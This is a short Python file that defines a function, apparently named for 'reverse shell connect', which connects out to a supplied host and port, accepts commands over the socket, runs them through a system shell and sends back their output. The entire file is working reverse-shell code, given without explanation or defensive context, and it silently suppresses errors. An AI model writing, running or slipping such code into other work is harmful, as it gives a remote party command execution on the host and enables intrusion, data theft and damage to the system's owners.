import socket as soc
import subprocess as sub
import os

def rsc(host: str, port: int):
    try:
        s = soc.socket(soc.AF_INET, soc.SOCK_STREAM)
        s.connect((host, port))

        while True:
            s.send(b"cmd> ")
            command = s.recv(1024).decode("utf-8").strip()

            if command.lower() in ["exit", "quit"]:
                break
            if command.startswith("cd "):
                try:
                    os.chdir(command[3:])
                    s.send(f"[+] Changed dir to {os.getcwd()}\n".encode())
                except Exception as e:
                    s.send(f"[!] {str(e)}\n".encode())
                continue

            rs = sub.run(command, shell=True, capture_output=True)
            ot = rs.stdout + rs.stderr
            if not ot:
                ot = b"[+] Command executed.\n"
            s.send(ot)
    except Exception as er:
        pass
    finally:
        try:
            s.close()
        except:
            pass
